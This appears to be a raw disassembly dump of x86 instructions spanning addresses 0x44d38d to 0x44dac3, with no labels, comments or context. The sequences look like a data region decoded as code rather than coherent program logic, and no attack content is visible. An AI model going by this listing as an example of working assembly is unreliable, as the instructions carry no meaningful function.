  44d38d:	add    BYTE PTR [eax-0x7c],0x4
  44d391:	add    BYTE PTR [eax],bl
  44d393:	inc    eax
  44d394:	push   es
  44d395:	add    al,BYTE PTR [eax]
  44d397:	pusha  
  44d398:	inc    ecx
  44d399:	popa   
  44d39a:	and    BYTE PTR [eax],al
  44d39c:	add    ebp,DWORD PTR [eax]
  44d39e:	add    ecx,DWORD PTR [ecx+eax*2+0x1c00020]
  44d3a5:	pusha  
  44d3a6:	inc    eax
  44d3a7:	add    DWORD PTR [ecx+0x59],esp
  44d3aa:	rol    BYTE PTR [edx],0xe0
  44d3ad:	and    BYTE PTR [edx],al
  44d3af:	or     BYTE PTR [eax],0x2a
  44d3b2:	inc    edx
  44d3b3:	add    BYTE PTR [esi],0x14
  44d3b6:	add    DWORD PTR [eax],eax
  44d3b8:	xor    al,0x88
  44d3ba:	add    BYTE PTR cs:[eax+0x4],al
  44d3be:	mov    al,0x0
  44d3c0:	add    BYTE PTR [eax+0x2654],al
  44d3c6:	add    al,0x2
  44d3c8:	add    BYTE PTR [eax],al
  44d3ca:	adc    BYTE PTR [eax],al
  44d3cc:	or     BYTE PTR [edx+0x28240d89],0x15
  44d3d3:	adc    BYTE PTR [eax],al
  44d3d5:	and    BYTE PTR [eax],al
  44d3d7:	add    DWORD PTR [eax],eax
  44d3d9:	nop
  44d3da:	add    BYTE PTR [eax+eax*1],cl
  44d3dd:	or     BYTE PTR [esi],ch
  44d3df:	push   es
  44d3e0:	add    BYTE PTR [eax+0x4],cl
  44d3e3:	add    BYTE PTR [eax],0x0
  44d3e6:	push   ecx
  44d3e7:	add    BYTE PTR [ecx],al
  44d3e9:	or     BYTE PTR [eax+0x41],ch
  44d3ec:	add    BYTE PTR [eax],dl
  44d3ee:	add    BYTE PTR [ebx],ah
  44d3f0:	mov    dl,0x2
  44d3f2:	ror    BYTE PTR [ecx+0x21],0x10
  44d3f6:	push   es
  44d3f7:	or     BYTE PTR [eax],al
  44d3f9:	inc    eax
  44d3fa:	add    BYTE PTR [eax],cl
  44d3fc:	inc    eax
  44d3fd:	inc    edx
  44d3fe:	add    BYTE PTR [edx+edx*2],cl
  44d401:	enter  0x80,0xd0
  44d405:	or     BYTE PTR [eax],0x40
  44d408:	add    BYTE PTR [ecx],dl
  44d40a:	or     DWORD PTR [eax+0x130042a0],0x24001000
  44d414:	sub    BYTE PTR [eax],al
  44d416:	dec    eax
  44d417:	and    al,0x10
  44d419:	or     BYTE PTR [eax-0x40],al
  44d41c:	or     ch,al
  44d41e:	add    BYTE PTR [eax],al
  44d420:	add    BYTE PTR [edx+0x8],cl
  44d423:	mov    BYTE PTR [eax],al
  44d425:	inc    eax
  44d426:	adc    DWORD PTR [eax-0x80],eax
  44d429:	push   eax
  44d42a:	adc    BYTE PTR [eax],al
  44d42c:	and    DWORD PTR ds:0x4004020,eax
  44d432:	sbb    BYTE PTR [ecx+0x10],ah
  44d435:	add    al,BYTE PTR [eax]
  44d437:	and    eax,0x2a8a202
  44d43c:	add    cl,al
  44d43e:	and    BYTE PTR [eax],al
  44d440:	add    eax,0x1a85004d
  44d445:	or     DWORD PTR [esp],0x12
  44d449:	retf   0x0
  44d44c:	and    DWORD PTR [ecx],esi
  44d44e:	inc    eax
  44d44f:	inc    eax
  44d450:	inc    eax
  44d451:	adc    al,0x8
  44d453:	add    DWORD PTR [eax],0x22
  44d456:	or     al,0xc1
  44d458:	add    DWORD PTR [eax+0x0],eax
  44d45b:	dec    esi
  44d45c:	mov    eax,ds:0x409080
  44d461:	add    BYTE PTR [eax],al
  44d463:	and    BYTE PTR [eax],dh
  44d465:	add    al,0x4
  44d467:	add    DWORD PTR [eax-0x77],eax
  44d46a:	xor    al,BYTE PTR [eax]
  44d46c:	dec    eax
  44d46d:	add    al,dh
  44d46f:	adc    dl,cl
  44d471:	add    BYTE PTR [eax],0x0
  44d474:	adc    al,0x22
  44d476:	adc    BYTE PTR [eax+0x41],ah
  44d479:	add    BYTE PTR [eax],al
  44d47b:	add    al,0x80
  44d47d:	inc    ebx
  44d47e:	inc    eax
  44d47f:	add    BYTE PTR [eax],ah
  44d481:	sub    DWORD PTR [ecx+eax*1+0x1d0d8108],eax
  44d488:	sub    BYTE PTR [edx],0x0
  44d48b:	adc    eax,DWORD PTR [eax]
  44d48d:	rol    BYTE PTR [eax],0x22
  44d490:	and    BYTE PTR [ebx+eax*1+0x2402000],al
  44d497:	bound  eax,QWORD PTR [eax]
  44d499:	xchg   esp,eax
  44d49a:	push   esp
  44d49b:	xchg   esp,eax
  44d49c:	add    DWORD PTR [eax+esi*4+0x48],edx
  44d4a0:	add    BYTE PTR [ecx],al
  44d4a2:	cmp    BYTE PTR [eax],cl
  44d4a4:	mov    DWORD PTR [eax],eax
  44d4a6:	test   eax,0x53030500
  44d4ab:	add    eax,0x12002084
  44d4b0:	mov    WORD PTR [eax],cs
  44d4b2:	mov    eax,0xa0
  44d4b7:	add    DWORD PTR [eax-0x70],esi
  44d4ba:	add    BYTE PTR [eax],al
  44d4bc:	inc    eax
  44d4bd:	stos   BYTE PTR es:[edi],al
  44d4be:	inc    ebp
  44d4bf:	cmp    al,BYTE PTR [eax]
  44d4c1:	nop
  44d4c2:	add    BYTE PTR [eax],al
  44d4c4:	add    BYTE PTR [ecx+eax*1+0x0],al
  44d4c8:	sub    BYTE PTR [eax-0x7fbee67e],ch
  44d4ce:	add    DWORD PTR [edi+0x1820061],ecx
  44d4d4:	or     BYTE PTR [ebx],al
  44d4d6:	add    ah,BYTE PTR [eax]
  44d4d8:	inc    eax
  44d4d9:	add    DWORD PTR [eax+0x2000],eax
  44d4df:	adc    BYTE PTR [eax+0x40001010],cl
  44d4e5:	adc    DWORD PTR [edx],eax
  44d4e7:	add    BYTE PTR [eax+edx*1],al
  44d4ea:	add    DWORD PTR [eax],edi
  44d4ec:	add    BYTE PTR [ecx+0x4600],al
  44d4f2:	or     ah,BYTE PTR [eax+0x0]
  44d4f5:	inc    eax
  44d4f6:	mov    BYTE PTR [eax],al
  44d4f8:	inc    edx
  44d4f9:	add    DWORD PTR [eax],0x42201420
  44d4ff:	cpuid  
  44d501:	add    DWORD PTR [eax-0x29feec00],eax
  44d507:	add    BYTE PTR [ebx],cl
  44d509:	add    BYTE PTR [eax],0x4d
  44d50c:	add    BYTE PTR [eax],dl
  44d50e:	add    BYTE PTR [eax],cl
  44d510:	dec    eax
  44d511:	adc    BYTE PTR [ecx+0x0],ah
  44d514:	mov    al,0x94
  44d516:	add    BYTE PTR [eax+0x8],al
  44d519:	or     eax,eax
  44d51b:	add    BYTE PTR [eax],dl
  44d51d:	sbb    DWORD PTR [edi+0x0],ebx
  44d520:	add    BYTE PTR [ecx+0x24],0xc
  44d524:	add    BYTE PTR [eax],al
  44d526:	and    BYTE PTR [edx+0x48],al
  44d529:	add    BYTE PTR [eax],0x54
  44d52c:	inc    eax
  44d52d:	add    BYTE PTR [eax],al
  44d52f:	loopne 0x44d53f
  44d531:	add    al,BYTE PTR [eax]
  44d533:	inc    eax
  44d534:	add    DWORD PTR [eax],edx
  44d536:	dec    esp
  44d537:	and    cl,BYTE PTR [ecx]
  44d539:	adc    ah,BYTE PTR [eax]
  44d53b:	mov    WORD PTR [ecx],es
  44d53d:	xor    BYTE PTR [eax],al
  44d53f:	nop
  44d540:	daa    
  44d541:	shl    BYTE PTR [eax],0x11
  44d544:	add    BYTE PTR [eax],al
  44d546:	mov    DWORD PTR ds:0x2000920,eax
  44d54c:	add    BYTE PTR [eax],0x6
  44d54f:	add    DWORD PTR [eax],ecx
  44d551:	and    DWORD PTR ds:0x2208c84,ebp
  44d557:	add    BYTE PTR [eax-0x47fdcd77],al
  44d55d:	add    BYTE PTR [eax],ah
  44d55f:	and    al,BYTE PTR ds:0xc0980014
  44d565:	call   0x4a11:0x20a8808
  44d56c:	inc    eax
  44d56d:	jo     0x44d5b7
  44d56f:	cmp    al,0x4
  44d571:	mov    BYTE PTR [eax],al
  44d573:	push   es
  44d574:	add    al,BYTE PTR [eax+0x36110137]
  44d57a:	add    BYTE PTR [ecx],ah
  44d57c:	add    BYTE PTR [eax],ah
  44d57e:	inc    edx
  44d57f:	mov    bl,BYTE PTR [ecx]
  44d581:	dec    ecx
  44d582:	and    BYTE PTR [eax+0xa],al
  44d585:	add    al,BYTE PTR [eax+0x7014620]
  44d58b:	adc    BYTE PTR [eax+0x40080100],al
  44d591:	add    BYTE PTR [eax],al
  44d593:	mov    ah,0x2
  44d595:	and    eax,0xb0002000
  44d59a:	add    BYTE PTR [eax],al
  44d59c:	add    al,0x4
  44d59e:	add    DWORD PTR [eax],0x0
  44d5a1:	add    BYTE PTR [edx],al
  44d5a3:	add    BYTE PTR [eax-0x80],al
  44d5a6:	add    al,BYTE PTR [ecx]
  44d5a8:	and    BYTE PTR [ebx],al
  44d5aa:	add    BYTE PTR [ecx-0x3d8fd800],dh
  44d5b0:	dec    ecx
  44d5b1:	sub    BYTE PTR [eax],dh
  44d5b3:	add    al,BYTE PTR [eax-0x37ff2fdc]
  44d5b9:	inc    eax
  44d5ba:	test   BYTE PTR [eax],dl
  44d5bc:	add    BYTE PTR [eax],al
  44d5be:	sub    BYTE PTR [ecx],0x84
  44d5c1:	adc    edx,esp
  44d5c3:	add    BYTE PTR [eax],al
  44d5c5:	sub    BYTE PTR [eax],al
  44d5c7:	add    BYTE PTR [eax-0x10],cl
  44d5ca:	or     BYTE PTR [eax],al
  44d5cc:	call   0xc84f5d5
  44d5d1:	add    BYTE PTR [eax+0x0],al
  44d5d4:	dec    edx
  44d5d5:	and    BYTE PTR ds:0x88118090,0x10
  44d5dc:	test   BYTE PTR [eax],dl
  44d5de:	add    BYTE PTR [eax+0x20008a21],cl
  44d5e4:	rcl    BYTE PTR [eax],0x0
  44d5e7:	adc    BYTE PTR [eax+0x2001808],0x80
  44d5ee:	adc    BYTE PTR [ecx+ecx*4+0x5a],al
  44d5f2:	add    BYTE PTR [eax+0x2],al
  44d5f5:	inc    esp
  44d5f6:	add    BYTE PTR [eax],ch
  44d5f8:	test   BYTE PTR [eax+0x3],al
  44d5fb:	and    DWORD PTR [eax+0x280080],0xc1800000
  44d605:	add    al,al
  44d607:	add    BYTE PTR [eax],ah
  44d609:	test   BYTE PTR [eax],dl
  44d60b:	add    BYTE PTR [eax],al
  44d60d:	scas   al,BYTE PTR es:[edi]
  44d60e:	add    BYTE PTR [eax],dl
  44d610:	add    BYTE PTR [eax],al
  44d612:	add    ch,al
  44d614:	add    BYTE PTR [ecx],0x24
  44d617:	add    BYTE PTR [eax+0x200a0000],al
  44d61d:	add    BYTE PTR [eax+edx*4-0x1dfff400],al
  44d624:	and    BYTE PTR [eax],al
  44d626:	push   0x80010020
  44d62b:	dec    eax
  44d62c:	cmp    BYTE PTR [eax+eax*1],dl
  44d62f:	add    BYTE PTR [eax],al
  44d631:	test   BYTE PTR [eax],al
  44d633:	add    BYTE PTR [eax],ah
  44d635:	add    eax,DWORD PTR [eax+0x48]
  44d638:	dec    edx
  44d639:	and    BYTE PTR [ebx],0x8
  44d63c:	and    al,0x49
  44d63e:	add    dl,BYTE PTR [ecx+0x40]
  44d641:	add    BYTE PTR [edx+ebx*1+0x8200108],ah
  44d648:	and    eax,0xc1009e00
  44d64d:	and    BYTE PTR [eax],dl
  44d64f:	add    al,BYTE PTR [eax]
  44d651:	shr    BYTE PTR [esp+eax*1+0x28002000],0x1
  44d659:	xor    cl,BYTE PTR [ebx]
  44d65b:	add    BYTE PTR [eax],al
  44d65d:	sbb    BYTE PTR [eax],ah
  44d65f:	inc    eax
  44d660:	rol    BYTE PTR [eax],0x10
  44d663:	nop
  44d664:	add    BYTE PTR [eax],cl
  44d666:	dec    eax
  44d667:	mov    al,ds:0x8102d300
  44d66c:	pusha  
  44d66d:	mov    BYTE PTR [eax+0x21402460],cl
  44d673:	add    al,BYTE PTR [edx]
  44d675:	add    BYTE PTR [eax],al
  44d677:	and    DWORD PTR [eax],esp
  44d679:	add    DWORD PTR [ecx+eax*1+0x8],eax
  44d67d:	adc    BYTE PTR [edx],cl
  44d67f:	retf   0x2800
  44d682:	adc    BYTE PTR [ecx-0x6f],0xa0
  44d686:	adc    BYTE PTR [edx+0x44],0x8
  44d68a:	inc    eax
  44d68b:	add    DWORD PTR [edi],eax
  44d68d:	inc    ebp
  44d68e:	or     BYTE PTR [eax+0x5429400],dl
  44d694:	inc    ecx
  44d695:	add    BYTE PTR ds:0x40190a03,cl
  44d69b:	inc    edx
  44d69c:	add    BYTE PTR [eax],cl
  44d69e:	add    DWORD PTR [eax],eax
  44d6a0:	add    cl,BYTE PTR [eax+0x0]
  44d6a3:	xchg   ecx,eax
  44d6a4:	and    BYTE PTR [eax+0x20],0x40
  44d6a8:	add    BYTE PTR [ebx+0x8200],dl
  44d6ae:	test   BYTE PTR [eax],ah
  44d6b0:	add    BYTE PTR [eax+eax*1],bl
  44d6b3:	add    BYTE PTR [eax+0x4080],al
  44d6b9:	inc    eax
  44d6ba:	or     al,0x0
  44d6bc:	add    BYTE PTR [eax],al
  44d6be:	pusha  
  44d6bf:	or     BYTE PTR [eax+eax*1],al
  44d6c2:	add    al,BYTE PTR [eax]
  44d6c4:	add    BYTE PTR [ecx-0x5f],al
  44d6c7:	add    al,0x22
  44d6c9:	and    eax,0x90814080
  44d6ce:	add    BYTE PTR [eax],ah
  44d6d0:	add    cl,ch
  44d6d2:	add    BYTE PTR [eax-0x7f],cl
  44d6d5:	add    al,BYTE PTR [eax]
  44d6d7:	add    BYTE PTR [eax+eax*4],al
  44d6da:	add    BYTE PTR [eax+eiz*2],al
  44d6dd:	adc    BYTE PTR [ecx+0x0],al
  44d6e0:	add    al,al
  44d6e2:	inc    ecx
  44d6e3:	and    BYTE PTR [eax],al
  44d6e5:	add    BYTE PTR [edx+0x48110410],bh
  44d6eb:	and    BYTE PTR [eax],0x1
  44d6ee:	add    BYTE PTR [eax],al
  44d6f0:	add    BYTE PTR [ecx],al
  44d6f2:	add    al,0x38
  44d6f4:	add    al,BYTE PTR [edx+0x44222010]
  44d6fa:	or     BYTE PTR [eax],cl
  44d6fc:	bound  eax,QWORD PTR [edx+0x0]
  44d6ff:	or     BYTE PTR [eax],al
  44d701:	add    BYTE PTR [ecx],al
  44d703:	or     al,0x60
  44d705:	sub    eax,DWORD PTR [edx+0x10800150]
  44d70b:	or     BYTE PTR [eax+eax*1],cl
  44d70e:	add    al,dl
  44d710:	inc    eax
  44d711:	add    al,0x2
  44d713:	and    dl,BYTE PTR [esi-0x68]
  44d716:	xchg   ecx,eax
  44d717:	add    BYTE PTR [esp+eax*4],dl
  44d71a:	mov    al,ds:0x84000
  44d71f:	adc    BYTE PTR [eax],al
  44d721:	add    BYTE PTR [eax],ah
  44d723:	inc    eax
  44d724:	loopne 0x44d6e9
  44d726:	or     BYTE PTR [edi+0x4],bl
  44d729:	and    BYTE PTR [eax],dl
  44d72b:	add    al,BYTE PTR [eax+eax*1]
  44d72e:	add    BYTE PTR [eax],al
  44d730:	add    BYTE PTR [ecx+0x10000081],0xa8
  44d737:	add    BYTE PTR ds:0x1900,dl
  44d73d:	rol    DWORD PTR [eax],1
  44d73f:	adc    cl,BYTE PTR [eax+0x1000a141]
  44d745:	add    al,0x82
  44d747:	adc    BYTE PTR [ecx+0x48],0xd0
  44d74b:	and    BYTE PTR [eax],al
  44d74d:	and    DWORD PTR [eax],edx
  44d74f:	or     BYTE PTR [eax],dl
  44d751:	add    al,al
  44d753:	add    BYTE PTR [eax],dl
  44d755:	add    BYTE PTR [eax+0x1],cl
  44d758:	push   es
  44d759:	or     BYTE PTR [ecx],al
  44d75b:	add    al,0xc
  44d75d:	add    BYTE PTR ds:0x82001011,ah
  44d763:	in     eax,0x84
  44d765:	add    al,0x0
  44d767:	adc    BYTE PTR [eax],ch
  44d769:	add    BYTE PTR [ecx-0x7ffffb80],al
  44d76f:	add    al,BYTE PTR [eax]
  44d771:	add    DWORD PTR [ecx-0x5bf7fe78],ecx
  44d777:	add    al,BYTE PTR [edx]
  44d779:	in     al,0x8
  44d77b:	push   eax
  44d77c:	add    eax,0x4a182118
  44d781:	add    DWORD PTR [eax],edx
  44d783:	or     BYTE PTR [ecx+0x41],cl
  44d786:	loope  0x44d788
  44d788:	cmp    BYTE PTR [edx],al
  44d78a:	pusha  
  44d78b:	sub    BYTE PTR [eax-0x7f],al
  44d78e:	add    BYTE PTR [esi+0x4181bf80],al
  44d794:	or     DWORD PTR [eax],edx
  44d796:	and    BYTE PTR [eax],al
  44d798:	add    BYTE PTR [ecx],al
  44d79a:	inc    ecx
  44d79b:	mov    BYTE PTR [eax+0x0],al
  44d79e:	add    BYTE PTR [eax],cl
  44d7a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d7a1:	sub    BYTE PTR [eax+0x40],al
  44d7a4:	or     BYTE PTR [eax],al
  44d7a6:	inc    edx
  44d7a7:	add    BYTE PTR [eax+0x2d785b2e],al
  44d7ad:	adc    BYTE PTR [ecx+0x0],dl
  44d7b0:	js     0x44d7f8
  44d7b2:	push   edx
  44d7b3:	and    BYTE PTR [eax-0x68],al
  44d7b6:	inc    eax
  44d7b7:	adc    DWORD PTR [esi+0x18],esp
  44d7ba:	xor    BYTE PTR [ecx],al
  44d7bc:	jp     0x44d7be
  44d7be:	add    DWORD PTR [eax],eax
  44d7c0:	add    BYTE PTR [eax],al
  44d7c2:	add    dl,BYTE PTR [ecx+eiz*2-0x7f5c7800]
  44d7c9:	mov    eax,DWORD PTR [eax+0x45]
  44d7cc:	add    BYTE PTR [edx+0x45050240],al
  44d7d2:	inc    eax
  44d7d3:	add    eax,0x86004dc0
  44d7d8:	add    DWORD PTR [eax],eax
  44d7da:	xor    al,0x8
  44d7dc:	inc    eax
  44d7dd:	or     DWORD PTR [eax+0x0],eax
  44d7e0:	and    BYTE PTR [eax+0xa142881],cl
  44d7e6:	adc    BYTE PTR [eax],al
  44d7e8:	mov    al,BYTE PTR [edx]
  44d7ea:	adc    BYTE PTR [eax],ah
  44d7ec:	sub    BYTE PTR [eax],al
  44d7ee:	add    BYTE PTR [ecx],ah
  44d7f0:	rol    DWORD PTR [ecx],1
  44d7f2:	or     BYTE PTR [eax],al
  44d7f4:	inc    eax
  44d7f5:	add    DWORD PTR [eax+0x47],eax
  44d7f8:	add    BYTE PTR [edx+0x0],al
  44d7fb:	add    al,BYTE PTR [eax+eax*1]
  44d7fe:	nop
  44d7ff:	add    BYTE PTR [ecx+ecx*1+0x204403],0x54
  44d807:	push   ecx
  44d808:	pop    eax
  44d809:	add    eax,eax
  44d80b:	ret    0x440
  44d80e:	shl    BYTE PTR [edx],1
  44d810:	add    BYTE PTR [ecx+0x21],al
  44d813:	add    BYTE PTR ds:0x8240000,dl
  44d819:	adc    ch,BYTE PTR [ebx]
  44d81b:	adc    al,0x50
  44d81d:	add    BYTE PTR [eax-0x7f7fffdf],dl
  44d823:	mov    BYTE PTR [edx],cl
  44d825:	or     BYTE PTR [eax+0x4cc09b00],al
  44d82b:	test   al,0x0
  44d82d:	add    BYTE PTR [eax+0x284022],al
  44d833:	inc    eax
  44d834:	add    BYTE PTR [eax],al
  44d836:	add    BYTE PTR gs:[edx+edi*2],al
  44d83a:	les    esp,FWORD PTR [ebp+0x0]
  44d83d:	rol    BYTE PTR [ecx],0xc
  44d840:	dec    edx
  44d841:	xor    BYTE PTR [edx],al
  44d843:	adc    al,0x84
  44d845:	add    BYTE PTR [eax+0x0],cl
  44d848:	and    BYTE PTR [ecx],ah
  44d84a:	add    DWORD PTR [eax-0x2e],eax
  44d84d:	add    BYTE PTR [eax],al
  44d84f:	push   es
  44d850:	sbb    DWORD PTR [eax+edx*4],0x0
  44d854:	add    BYTE PTR [edx],cl
  44d856:	adc    al,dl
  44d858:	add    BYTE PTR [eax+ebx*1],ah
  44d85b:	inc    eax
  44d85c:	add    BYTE PTR [eax],al
  44d85e:	add    BYTE PTR [edx],dl
  44d860:	inc    ecx
  44d861:	inc    esp
  44d862:	add    al,dl
  44d864:	add    BYTE PTR [ecx+0x41],dl
  44d867:	adc    DWORD PTR [edx-0x1ffb7ffe],eax
  44d86d:	les    eax,FWORD PTR [eax]
  44d86f:	add    DWORD PTR [eax],eax
  44d871:	add    BYTE PTR [edx],0x31
  44d874:	or     DWORD PTR [eax],eax
  44d876:	adc    al,0x9
  44d878:	pusha  
  44d879:	or     BYTE PTR [eax+eax*2],al
  44d87c:	dec    ebp
  44d87d:	xor    BYTE PTR [eax],al
  44d87f:	add    BYTE PTR [eax],0x41
  44d882:	adc    al,al
  44d884:	sbb    BYTE PTR [ebx],0x21
  44d887:	mov    al,ds:0x3a108
  44d88c:	adc    al,0x3
  44d88e:	add    BYTE PTR [ebx],ah
  44d890:	add    BYTE PTR [eax+eax*2+0x4067930],al
  44d897:	add    BYTE PTR [eax],al
  44d899:	add    ch,BYTE PTR [ecx]
  44d89b:	or     al,0x60
  44d89d:	add    BYTE PTR [ecx+0x4],al
  44d8a0:	sub    BYTE PTR [eax+ecx*2-0x7f6fffbc],0x60
  44d8a8:	add    BYTE PTR [eax+0x10],al
  44d8ab:	imul   BYTE PTR [ecx+0x9]
  44d8ae:	and    BYTE PTR [eax+0x48],ah
  44d8b1:	inc    eax
  44d8b2:	push   0x20034400
  44d8b7:	push   ecx
  44d8b8:	adc    BYTE PTR [edi],ah
  44d8ba:	mov    al,ds:0x41280040
  44d8bf:	sub    BYTE PTR [eax+0x88f0402],al
  44d8c5:	bound  eax,QWORD PTR [eax]
  44d8c7:	mov    al,ds:0x6800
  44d8cc:	push   ecx
  44d8cd:	inc    esp
  44d8ce:	jb     0x44d880
  44d8d0:	add    BYTE PTR [ecx],al
  44d8d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d8d3:	fsubrp st(0),st
  44d8d5:	inc    eax
  44d8d6:	and    al,BYTE PTR [eax-0x3f]
  44d8d9:	and    al,0xa0
  44d8db:	add    eax,edx
  44d8dd:	add    BYTE PTR [edx],cl
  44d8df:	add    DWORD PTR [eax],esp
  44d8e1:	inc    esi
  44d8e2:	or     edx,DWORD PTR [edi+eax*2+0x18200460]
  44d8e9:	nop
  44d8ea:	sub    BYTE PTR [eax+0x0],cl
  44d8ed:	and    BYTE PTR [eax],al
  44d8ef:	add    BYTE PTR [eax+0x0],al
  44d8f2:	sbb    cl,0xc
  44d8f5:	inc    eax
  44d8f6:	inc    ecx
  44d8f7:	sbb    ch,dh
  44d8f9:	inc    esi
  44d8fa:	push   eax
  44d8fb:	loopne 0x44d8fd
  44d8fd:	add    BYTE PTR [eax],ah
  44d8ff:	add    esp,eax
  44d901:	add    DWORD PTR [ecx],eax
  44d903:	adc    eax,0x244448
  44d908:	add    ch,BYTE PTR [eax]
  44d90a:	inc    eax
  44d90b:	add    edx,DWORD PTR [eax-0x4bfbdec0]
  44d911:	xor    BYTE PTR [eax],dl
  44d913:	add    BYTE PTR [eax+0x8108429],cl
  44d919:	add    al,0x0
  44d91b:	add    cl,BYTE PTR [edx+0x59a100]
  44d921:	or     BYTE PTR [ebx],ch
  44d923:	aam    0x2
  44d925:	add    DWORD PTR [eax+0x28000018],eax
  44d92b:	add    BYTE PTR [eax],dl
  44d92d:	add    BYTE PTR [edx+0x6c010480],al
  44d933:	or     BYTE PTR [eax],ch
  44d935:	add    DWORD PTR [eax+eax*1+0x8],ecx
  44d939:	add    BYTE PTR [esi-0x7dfebddf],al
  44d93f:	mov    al,ds:0x20106040
  44d944:	add    BYTE PTR [eax+0x5],dl
  44d947:	add    BYTE PTR [eax],al
  44d949:	add    DWORD PTR [eax],eax
  44d94b:	add    cl,BYTE PTR [ebx]
  44d94d:	mov    BYTE PTR [edi],al
  44d94f:	and    BYTE PTR [eax],ch
  44d951:	inc    eax
  44d952:	xor    BYTE PTR [eax],al
  44d954:	inc    ecx
  44d955:	inc    eax
  44d956:	or     DWORD PTR [edx+eax*2+0x40],eax
  44d95a:	inc    eax
  44d95b:	add    BYTE PTR [eax],ah
  44d95d:	add    BYTE PTR [ecx],al
  44d95f:	xor    DWORD PTR gs:[eax+0x0],ebp
  44d963:	retf   0x2031
  44d966:	add    BYTE PTR [eax],al
  44d968:	pop    eax
  44d969:	add    BYTE PTR [eax],ah
  44d96b:	mov    BYTE PTR [ebx],al
  44d96d:	dec    eax
  44d96e:	add    BYTE PTR [esi-0x27],dl
  44d971:	xchg   ebp,eax
  44d972:	inc    eax
  44d973:	rcr    BYTE PTR [eax+0x42],0xc2
  44d977:	add    al,BYTE PTR [eax+0x60]
  44d97a:	add    BYTE PTR [eax],al
  44d97c:	add    BYTE PTR [eax],al
  44d97e:	push   esi
  44d97f:	adc    BYTE PTR [ebp+0x0],0x0
  44d983:	adc    dh,dl
  44d985:	add    BYTE PTR ds:0x44413100,ah
  44d98b:	adc    BYTE PTR [eax-0x78],al
  44d98e:	add    BYTE PTR [eax],0xa
  44d991:	add    BYTE PTR [edx-0x7be7fffe],al
  44d997:	and    BYTE PTR [eax-0x30],bl
  44d99a:	loope  0x44d9ad
  44d99c:	add    al,0x41
  44d99e:	add    BYTE PTR [eax],al
  44d9a0:	and    BYTE PTR ss:[eax+0x0],bl
  44d9a4:	or     DWORD PTR ds:0x40040,0x40
  44d9ab:	or     BYTE PTR [esi],al
  44d9ad:	adc    DWORD PTR [eax],eax
  44d9af:	cmp    ah,BYTE PTR [eax+0x8]
  44d9b2:	add    BYTE PTR [eax],0x41
  44d9b5:	and    BYTE PTR [edx+eiz*4],al
  44d9b8:	add    al,BYTE PTR [eax]
  44d9ba:	add    DWORD PTR ds:0x10480864,eax
  44d9c0:	sub    al,0x20
  44d9c2:	add    BYTE PTR [eax],0x1c
  44d9c5:	and    BYTE PTR ds:0xe040100,0x0
  44d9cc:	add    BYTE PTR [ecx+0x10808c01],bl
  44d9d2:	add    al,0x2
  44d9d4:	dec    eax
  44d9d5:	and    cl,BYTE PTR [edx]
  44d9d7:	add    BYTE PTR [eax],ah
  44d9d9:	and    BYTE PTR [eax+0x8],al
  44d9dc:	add    al,al
  44d9de:	and    BYTE PTR [eax],al
  44d9e0:	add    BYTE PTR [eax+0x0],cl
  44d9e3:	jne    0x44d9e7
  44d9e5:	add    BYTE PTR [eax],0x80
  44d9e8:	add    al,0x27
  44d9ea:	and    BYTE PTR [eax],0x0
  44d9ed:	add    BYTE PTR [ecx-0x80],ch
  44d9f0:	call   0x6848:0x80220020
  44d9f7:	mov    al,0x18
  44d9f9:	inc    eax
  44d9fa:	adc    al,0xc3
  44d9fc:	or     BYTE PTR [eax],dl
  44d9fe:	sub    ah,BYTE PTR [eax]
  44da00:	add    BYTE PTR [eax],ah
  44da02:	add    BYTE PTR [eax+eax*1+0x1020000],dl
  44da09:	add    al,0x8
  44da0b:	inc    ecx
  44da0c:	rcl    BYTE PTR [ecx],0x20
  44da0f:	ins    BYTE PTR es:[edi],dx
  44da10:	sbb    BYTE PTR [eax-0x80],dl
  44da13:	add    BYTE PTR [eax],ah
  44da15:	xor    BYTE PTR [edx+0x9115094],cl
  44da1b:	add    al,BYTE PTR [eax]
  44da1d:	add    al,BYTE PTR [eax]
  44da1f:	das    
  44da20:	push   eax
  44da21:	push   eax
  44da22:	add    BYTE PTR [edx],al
  44da24:	add    eax,DWORD PTR [eax+eax*8]
  44da27:	or     BYTE PTR [ebp+0xd004b10],al
  44da2d:	add    BYTE PTR [esi],cl
  44da2f:	or     BYTE PTR [eax+0x1],al
  44da32:	add    BYTE PTR [ebx+0x42],dl
  44da35:	inc    eax
  44da36:	inc    eax
  44da37:	retf   0x0
  44da3a:	add    BYTE PTR [eax],0xa0
  44da3d:	xchg   BYTE PTR [eax],al
  44da3f:	mov    eax,ds:0x24000a40
  44da44:	add    eax,0x94800a0c
  44da49:	xor    BYTE PTR [eax+0x0],ah
  44da4c:	add    BYTE PTR [esi+0x10],ah
  44da4f:	add    BYTE PTR [eax],0x88
  44da52:	and    ch,BYTE PTR [eax]
  44da54:	add    BYTE PTR [eax],al
  44da56:	add    DWORD PTR [eax],eax
  44da58:	adc    BYTE PTR [eax+0x58],al
  44da5b:	adc    ch,BYTE PTR [ebx+0x214348c0]
  44da61:	cmp    ah,BYTE PTR [eax]
  44da63:	add    BYTE PTR [eax],0x24
  44da66:	pusha  
  44da67:	add    DWORD PTR [eax],eax
  44da69:	add    BYTE PTR [esp+eiz*4],dh
  44da6c:	rol    BYTE PTR [edx+0x30000000],0x0
  44da73:	xchg   esp,eax
  44da74:	adc    BYTE PTR [eax],0xc0
  44da77:	add    BYTE PTR [ecx],al
  44da79:	add    dl,BYTE PTR [ecx+0x20]
  44da7c:	inc    esp
  44da7d:	and    BYTE PTR [eax],al
  44da7f:	or     BYTE PTR [eax+0x20414881],al
  44da85:	and    eax,0x80400000
  44da8a:	inc    eax
  44da8b:	add    dl,BYTE PTR [eax+esi*1]
  44da8e:	add    eax,DWORD PTR [eax]
  44da90:	add    eax,0x95001807
  44da95:	add    BYTE PTR [eax],ah
  44da97:	add    BYTE PTR [esp+ecx*1-0x77ffcfa4],cl
  44da9e:	adc    BYTE PTR [eax+edx*1+0x24],al
  44daa2:	add    BYTE PTR [eax],al
  44daa4:	add    BYTE PTR [eax],al
  44daa6:	add    dl,ch
  44daa8:	add    BYTE PTR [ebp+0x10],al
  44daab:	dec    eax
  44daac:	add    BYTE PTR [eax],cl
  44daae:	or     BYTE PTR [eax],dl
  44dab0:	add    BYTE PTR [eax],al
  44dab2:	pop    edx
  44dab3:	add    al,BYTE PTR [eax-0x74]
  44dab6:	lock inc esp
  44dab8:	add    BYTE PTR [eax-0x5be4000],al
  44dabe:	add    eax,0x5c2001e1
  44dac3:	add    BYTE PTR [eax+0x10260008],al
